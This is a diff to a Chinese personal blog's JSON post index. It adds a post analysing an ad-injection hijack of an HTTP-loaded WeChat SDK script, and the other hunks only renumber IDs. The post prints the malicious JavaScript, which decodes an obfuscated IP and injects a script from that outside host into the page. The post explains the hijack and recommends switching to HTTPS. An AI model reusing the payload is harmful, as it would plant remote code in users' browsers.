@@ -56,8 +56,16 @@
     "Content": "\r\n又不知道从哪篇博文里看到了《原则》这本书的推荐，习惯使然上豆瓣看了下评论，分数达 8.5 分让人意外，老实说，对于这种书名和介绍我会想当然将其归类为成功学、鸡汤便不再理会，不过作者确实是成功人士，或许某些观点也值得学习下。花了两晚上时间囫囵吞枣似的看完，做了写摘录，书中许多观点是很有价值的。\r\n\r\n## 原则\r\n\r\n> 思考，总结提炼原则，并且知行合一的实践原则，同时保持谦逊使得大脑更加开放和包容。\r\n>\r\n> 1. 独立思考并决定 \r\n> 2. 以可信度加权的方式做决定\r\n> 3. 遵照原则做事\r\n\r\n不仅要独立思考，同时要要保持谦逊和心胸开阔，才能动用自己的最佳思维，在肯定自己是对的之前，还要知道自己为什么是对的，对自己想法的肯定应该来自于事实，而非自以为是。\r\n\r\n## 投资\r\n\r\n> 股价反映的是人们的预期，当实际结果比预期好时，股价会上涨，反之则跌。<strong>……</strong>"
   },
   {
-    "fileName": "裸辞.md",
+    "fileName": "记一次流量劫持.md",
     "ID": 7,
+    "Title": "记一次流量劫持",
+    "Tags": "编码",
+    "PublishDate": "2018/9/17 15:15",
+    "Content": "\r\n又是填队友坑，拿到代码本地启动后发现神奇的一幕，页面被劫持插入了广告，弹出几秒钟后消失。\r\n\r\n![jc0](http://wx3.sinaimg.cn/large/007113CZgy1fvcl8cuxcsj30bf037dgb.jpg)\r\n\r\n让我来看看这是咋回事，因为某个微信 sdk 使用了 http，该 JS 脚本的响应结果被篡改替换了。\r\n\r\n![jc2](http://wx3.sinaimg.cn/large/007113CZgy1fvcl8i86ugj30kq01dwei.jpg)\r\n\r\n![jc3](http://wx4.sinaimg.cn/large/007113CZgy1fvcl8ncohpj31370ia0va.jpg)\r\n\r\n**http://res.wx.qq.com/open/js/jweixin-1.2.0.js** 该请求因为使用了 http 给了流量劫持可乘之机，未能返回正确的脚本内容，而是返回了一个被精心构造的恶意脚本。\r\n\r\n简单分析下这个恶意脚本做了啥，我们 http 请求 **http://res.wx.qq.com/open/js/jweixin-1.2.0.js** 的响应结果被劫持替换成了下面的脚本，这个脚本又再次构造请求带上标识符去拿到真实的内容，同时将自己的恶意脚本注入到页面上。\r\n\r\n\r\n```javascript\r\n!function(e, t, n, o, r, i, a, c) {\r\n    // 这里有意思了，之后后会发现变量 c 的结果是一个 IP 地址\r\n    // \"124.232.160.178\"\r\n    // 这个 IP 地址加上拼凑的字符串变成了 http://124.232.160.178/v1/a/?u=0 \r\n    // 通过 insertBefore 注入了恶意脚本\r\n    c = function(e, t, n) {\r\n        for (t = e % 256,\r\n        n = 3; 0 < n; n--)\r\n            t = (e = Math.floor(e / 256)) % 256 + \".\" + t;\r\n        return t\r\n    }(2095620274),\r\n    (a = function(e) {\r\n        r = t.createElement(n),\r\n        i = t.getElementsByTagName(n)[0],\r\n        r.src = \"//\" + e,\r\n        i.parentNode.insertBefore(r, i)\r\n    }\r\n    // 这儿有点意思，似乎是为了避免重复劫持，\r\n    // 通过时间戳和标识符再次请求我们需要的脚本，\r\n    // 这次返回的是真实未被篡改的脚本内容\r\n    )(o + (0 < o.indexOf(\"?\") ? \"&\" : \"?\") + \"_t\" + (new Date).getTime() + \"=0i\"),\r\n    // 注入恶意脚本 http://124.232.160.178/v1/a/?u=0 \r\n    a(c + \"/v1/a/?u=0\")\r\n}(window, document, \"script\", \"res.wx.qq.com/open/js/jweixin-1.2.0.js\");\r\n```\r\n\r\n所以解决问题的办法就是把页面上的 http 替换成 https 或是把资源放到本地存储。<strong>……</strong>"
+  },
+  {
+    "fileName": "裸辞.md",
+    "ID": 8,
     "Title": "裸辞",
     "Tags": "碎念",
     "PublishDate": "2017/12/6 20:28:16",
@@ -65,7 +73,7 @@
   },
   {
     "fileName": "蛤丝（Haskell）学习.md",
-    "ID": 8,
+    "ID": 9,
     "Title": "蛤丝（Haskell）学习",
     "Tags": "编程",
     "PublishDate": "2018/6/19 23:42",
@@ -73,7 +81,7 @@
   },
   {
     "fileName": "蛤丝(Haskell)学习.md",
-    "ID": 9,
+    "ID": 10,
     "Title": "蛤丝(Haskell)学习",
     "Tags": "编程",
     "PublishDate": "2018/6/19 23:42",
@@ -81,7 +89,7 @@
   },
   {
     "fileName": "自由.md",
-    "ID": 10,
+    "ID": 11,
     "Title": "自由",
     "Tags": "随想",
     "PublishDate": "2017/7/30 22:43:40",
@@ -89,7 +97,7 @@
   },
   {
     "fileName": "编译原理学习.md",
-    "ID": 11,
+    "ID": 12,
     "Title": "编译原理学习",
     "Tags": "编程",
     "PublishDate": "2018/5/27 23:26",
@@ -97,7 +105,7 @@
   },
   {
     "fileName": "程序员技能思考.md",
-    "ID": 12,
+    "ID": 13,
     "Title": "程序员技能思考",
     "Tags": "编程 | 随想",
     "PublishDate": "2018/7/9 16:06:33",
@@ -105,7 +113,7 @@
   },
   {
     "fileName": "用JS 实现 Lisp 里的流.md",
-    "ID": 13,
+    "ID": 14,
     "Title": "用JS 实现 Lisp 里的流",
     "Tags": "编程",
     "PublishDate": "2018/3/10 21:24:59",
@@ -113,7 +121,7 @@
   },
   {
     "fileName": "用 JS 撸个 LISP 解释器（3）.md",
-    "ID": 14,
+    "ID": 15,
     "Title": "用 JS 撸个 LISP 解释器（3）",
     "Tags": "编程 | 坑",
     "PublishDate": "2018/6/10 23:58",
@@ -121,7 +129,7 @@
   },
   {
     "fileName": "用 JS 撸个 LISP 解释器（2）.md",
-    "ID": 15,
+    "ID": 16,
     "Title": "用 JS 撸个 LISP 解释器（2）",
     "Tags": "编程 | 坑",
     "PublishDate": "2018/6/8 19:53",
@@ -129,7 +137,7 @@
   },
   {
     "fileName": "用 JS 撸个 LISP 解释器.md",
-    "ID": 16,
+    "ID": 17,
     "Title": "用 JS 撸个 LISP 解释器",
     "PublishDate": "2018/6/3 21:45",
     "Tags": "编程 | JS | 坑",
@@ -137,7 +145,7 @@
   },
   {
     "fileName": "用 CSS 实现网页追踪与分析.md",
-    "ID": 17,
+    "ID": 18,
     "Title": "用 CSS 实现网页追踪与分析",
     "Tags": "前端",
     "PublishDate": "2018/1/20 22:15:05",
@@ -145,7 +153,7 @@
   },
   {
     "fileName": "熵与人生.md",
-    "ID": 18,
+    "ID": 19,
     "Title": "熵与人生",
     "Tags": "随想",
     "PublishDate": "2015/3/27 21:15",
@@ -153,7 +161,7 @@
   },
   {
     "fileName": "滚动条导致计算值元素跳动的处理.md",
-    "ID": 19,
+    "ID": 20,
     "Title": "滚动条导致计算值元素跳动的处理",
     "Tags": "前端 | 编码",
     "PublishDate": "2017/12/14 18:29:43",
@@ -161,7 +169,7 @@
   },
   {
     "fileName": "浅谈对架构的理解.md",
-    "ID": 20,
+    "ID": 21,
     "Title": "浅谈对架构的理解",
     "Tags": "编程 | 随想",
     "PublishDate": "2018/7/22 23:57:51",
@@ -169,7 +177,7 @@
   },
   {
     "fileName": "无题.md",
-    "ID": 21,
+    "ID": 22,
     "Title": "无题",
     "Tags": "随想",
     "PublishDate": "2018/9/1 15:14",
@@ -177,7 +185,7 @@
   },
   {
     "fileName": "新的计划.md",
-    "ID": 22,
+    "ID": 23,
     "Title": "新的计划",
     "Tags": "碎念",
     "PublishDate": "2018/1/20 17:19:52",
@@ -185,7 +193,7 @@
   },
   {
     "fileName": "数据抽象.md",
-    "ID": 23,
+    "ID": 24,
     "Title": "数据抽象",
     "Tags": "编码 | 哲思",
     "PublishDate": "2017/8/22 23:30:48",
@@ -193,7 +201,7 @@
   },
   {
     "fileName": "攀登抽象的阶梯.md",
-    "ID": 24,
+    "ID": 25,
     "Title": "攀登抽象的阶梯",
     "Tags": "编码 | 哲思",
     "PublishDate": "2017/8/9 23:00:41",
@@ -201,7 +209,7 @@
   },
   {
     "fileName": "当我说 Immutable 时在说什么.md",
-    "ID": 25,
+    "ID": 26,
     "Title": "当我说 Immutable 时在说什么？",
     "Tags": "前端 | 编码",
     "PublishDate": "2018/9/16 14:45",
@@ -209,7 +217,7 @@
   },
   {
     "fileName": "屋中大象.md",
-    "ID": 26,
+    "ID": 27,
     "Title": "屋中大象",
     "Tags": "编程",
     "PublishDate": "2018/8/4 13:12:26",
@@ -217,7 +225,7 @@
   },
   {
     "fileName": "对自我的思考.md",
-    "ID": 27,
+    "ID": 28,
     "Title": "对自我的思考",
     "Tags": "哲思",
     "PublishDate": "2017/8/6 17:52:40",
@@ -225,7 +233,7 @@
   },
   {
     "fileName": "如何打印 Web 页面上指定区域的内容.md",
-    "ID": 28,
+    "ID": 29,
     "Title": "如何打印 Web 页面上指定区域的内容",
     "Tags": "编码 | 前端",
     "PublishDate": "2017/12/11 13:24:52",
@@ -233,7 +241,7 @@
   },
   {
     "fileName": "央视纪录片《极地》.md",
-    "ID": 29,
+    "ID": 30,
     "Title": "央视纪录片《极地》",
     "Tags": "碎念",
     "PublishDate": "2018/1/22 21:56:11",
@@ -241,7 +249,7 @@
   },
   {
     "fileName": "国庆云南游记.md",
-    "ID": 30,
+    "ID": 31,
     "Title": "国庆云南游记",
     "Tags": "碎念",
     "PublishDate": "2017/10/15 19:17",
@@ -249,7 +257,7 @@
   },
   {
     "fileName": "又一篇什么是Monad.md",
-    "ID": 31,
+    "ID": 32,
     "Title": "又一篇什么是Monad",
     "Tags": "编码",
     "PublishDate": "2017/9/1 21:48:38",
@@ -257,7 +265,7 @@
   },
   {
     "fileName": "又一篇什么是 Monad.md",
-    "ID": 32,
+    "ID": 33,
     "Title": "又一篇什么是 Monad",
     "Tags": "编码",
     "PublishDate": "2017/9/1 21:48:38",
@@ -265,7 +273,7 @@
   },
   {
     "fileName": "博弈论带来的启示-信任的进化.md",
-    "ID": 33,
+    "ID": 34,
     "Title": "博弈论带来的启示-信任的进化",
     "Tags": "随想",
     "PublishDate": "2017/12/15 00:04:47",
@@ -273,7 +281,7 @@
   },
   {
     "fileName": "博客文章获取接口修改.md",
-    "ID": 34,
+    "ID": 35,
     "Title": "博客文章获取接口修改",
     "Tags": "编码",
     "PublishDate": "2017/7/25 22:43:00",
@@ -281,7 +289,7 @@
   },
   {
     "fileName": "博客搬家.md",
-    "ID": 35,
+    "ID": 36,
     "Title": "博客搬家",
     "Tags": "编码",
     "PublishDate": "2017/10/28",
@@ -289,7 +297,7 @@
   },
   {
     "fileName": "前端监控.md",
-    "ID": 36,
+    "ID": 37,
     "Title": "前端监控",
     "Tags": "前端",
     "PublishDate": "2018/7/10 18:09:14",
@@ -297,7 +305,7 @@
   },
   {
     "fileName": "利用 serviceWorker 快速把网站变成 PWA 应用.md",
-    "ID": 37,
+    "ID": 38,
     "Title": "利用 serviceWorker 快速把网站变成 PWA 应用",
     "Tags": "前端 | 编程",
     "PublishDate": "2017/12/17 20:16:06",
@@ -305,7 +313,7 @@
   },
   {
     "fileName": "写作是一个学习过程.md",
-    "ID": 38,
+    "ID": 39,
     "Title": "写作是一个学习过程",
     "Tags": "碎念",
     "PublishDate": "2018/3/6 00:59:23",
@@ -313,7 +321,7 @@
   },
   {
     "fileName": "写一个简单的 Markdown 编辑器.md",
-    "ID": 39,
+    "ID": 40,
     "Title": "写一个简单的 Markdown 编辑器",
     "Tags": "编码",
     "PublishDate": "2017/12/7 00:28:49",
@@ -321,7 +329,7 @@
   },
   {
     "fileName": "关于沟通.md",
-    "ID": 40,
+    "ID": 41,
     "Title": "关于沟通",
     "Tags": "随想",
     "PublishDate": "2015/9/18 22:29",
@@ -329,7 +337,7 @@
   },
   {
     "fileName": "关于并发的理解.md",
-    "ID": 41,
+    "ID": 42,
     "Title": "关于并发的理解",
     "Tags": "编程",
     "PublishDate": "2018/3/4 13:41:37",
@@ -337,7 +345,7 @@
   },
   {
     "fileName": "关于可视化页面构建工具的思考.md",
-    "ID": 42,
+    "ID": 43,
     "Title": "关于可视化页面构建工具的思考",
     "Tags": "编程 | 前端 | 随想",
     "PublishDate": "2018/06/05 21:30",
@@ -345,7 +353,7 @@
   },
   {
     "fileName": "使用 Systemd 设置 Linux 应用自启动.md",
-    "ID": 43,
+    "ID": 44,
     "Title": "使用 Systemd 设置 Linux 应用自启动",
     "Tags": "编码 | Linux",
     "PublishDate": "2017/12/11 17:27:03",
@@ -353,7 +361,7 @@
   },
   {
     "fileName": "从静态博客转到Golang + MongoDB后端.md",
-    "ID": 44,
+    "ID": 45,
     "Title": "从静态博客转到Golang + MongoDB后端",
     "Tags": "编码",
     "PublishDate": "2017/11/29 23:39:47",
@@ -361,7 +369,7 @@
   },
   {
     "fileName": "从浏览器工作机制看性能优化.md",
-    "ID": 45,
+    "ID": 46,
     "Title": "从浏览器工作机制看性能优化",
     "PublishDate": "2018/7/9 15:31",
     "Tags": "前端",
@@ -369,7 +377,7 @@
   },
   {
     "fileName": "书写以及文字.md",
-    "ID": 46,
+    "ID": 47,
     "Title": "书写以及文字",
     "Tags": "随想",
     "PublishDate": "2015/1/31 23:06",
@@ -377,7 +385,7 @@
   },
   {
     "fileName": "不求甚解与刨根问底.md",
-    "ID": 47,
+    "ID": 48,
     "Title": "不求甚解与刨根问底",
     "Tags": "随想",
     "PublishDate": "2017/9/5 23:28",
@@ -385,7 +393,7 @@
   },
   {
     "fileName": "不念过去，不畏将来，珍惜现在，再见 2017.md",
-    "ID": 48,
+    "ID": 49,
     "Title": "不念过去，不畏将来，珍惜现在，再见 2017",
     "Tags": "碎念",
     "PublishDate": "2017/12/31 17:02:01",
@@ -393,7 +401,7 @@
   },
   {
     "fileName": "七夕.md",
-    "ID": 49,
+    "ID": 50,
     "Title": "七夕",
     "Tags": "碎念",
     "PublishDate": "2017/8/29 21:59:29",
@@ -401,7 +409,7 @@
   },
   {
     "fileName": "《逻辑的引擎》读后感.md",
-    "ID": 50,
+    "ID": 51,
     "Title": "《逻辑的引擎》读后感",
     "Tags": "碎念 | 读书",
     "PublishDate": "2018/2/26 00:56:10",
@@ -409,7 +417,7 @@
   },
   {
     "fileName": "《寻梦环游记》观后感 - 终极的死亡.md",
-    "ID": 51,
+    "ID": 52,
     "Title": "《寻梦环游记》观后感 - 终极的死亡",
     "Tags": "碎念",
     "PublishDate": "2017/12/6 20:40:50",
@@ -417,7 +425,7 @@
   },
   {
     "fileName": "Webpack 4 升级.md",
-    "ID": 52,
+    "ID": 53,
     "Title": "Webpack 4 升级",
     "Tags": "前端",
     "PublishDate": "2018/3/14 01:12:51",
@@ -425,7 +433,7 @@
   },
   {
     "fileName": "Web Worker 与 Service Worker.md",
-    "ID": 53,
+    "ID": 54,
     "Title": "Web Worker 与 Service Worker",
     "Tags": "前端 | 编程",
     "PublishDate": "2017/12/16 21:09:35",
@@ -433,7 +441,7 @@
   },
   {
     "fileName": "ukulele.md",
-    "ID": 54,
+    "ID": 55,
     "Title": "ukulele",
     "Tags": "碎念",
     "PublishDate": "2017/7/22",
@@ -441,7 +449,7 @@
   },
   {
     "fileName": "Rust 学习笔记.md",
-    "ID": 55,
+    "ID": 56,
     "Title": "Rust 学习笔记",
     "Tags": "编程",
     "PublishDate": "2018/8/6 19:25:28",
@@ -449,7 +457,7 @@
   },
   {
     "fileName": "rem、vhvw 学习笔记.md",
-    "ID": 56,
+    "ID": 57,
     "Title": "rem、vh/vw 学习笔记",
     "Tags": "前端",
     "PublishDate": "2018/7/27 18:03:30",
@@ -457,7 +465,7 @@
   },
   {
     "fileName": "React Fiber 初探.md",
-    "ID": 57,
+    "ID": 58,
     "Title": "React Fiber 初探",
     "Tags": "前端",
     "PublishDate": "2018/8/18 23:47",
@@ -465,7 +473,7 @@
   },
   {
     "fileName": "koa-compose 浅析.md",
-    "ID": 58,
+    "ID": 59,
     "Title": "koa-compose 浅析",
     "Tags": "前端",
     "PublishDate": "2018/8/1 22:07",
@@ -473,7 +481,7 @@
   },
   {
     "fileName": "JS任督二脉-原型.md",
-    "ID": 59,
+    "ID": 60,
     "Title": "JS任督二脉-原型",
     "Tags": "编码 | 前端",
     "PublishDate": "2015/12/24 23:43",
@@ -481,7 +489,7 @@
   },
   {
     "fileName": "JS任督二脉-作用域.md",
-    "ID": 60,
+    "ID": 61,
     "Title": "JS任督二脉-作用域",
     "Tags": "编码 | 前端",
     "PublishDate": "2015/12/8 22:40",
@@ -489,7 +497,7 @@
   },
   {
     "fileName": "JS 学习补遗.md",
-    "ID": 61,
+    "ID": 62,
     "Title": "JS 学习补遗",
     "Tags": "前端",
     "PublishDate": "2018/8/13 0:40:49",
@@ -497,7 +505,7 @@
   },
   {
     "fileName": "Cycle.js 体验.md",
-    "ID": 62,
+    "ID": 63,
     "Title": "Cycle.js 体验",
     "Tags": "前端",
     "PublishDate": "2018/3/25 20:38:26",
@@ -505,7 +513,7 @@
   },
   {
     "fileName": "CSS3动画学习.md",
-    "ID": 63,
+    "ID": 64,
     "Title": "CSS3动画学习",
     "Tags": "编码",
     "PublishDate": "2017/11/12 15:29:49",
@@ -513,7 +521,7 @@
   },
   {
     "fileName": "coding.md",
-    "ID": 64,
+    "ID": 65,
     "Title": "coding",
     "Tags": "碎念",
     "PublishDate": "2017/7/20 01:35:08",
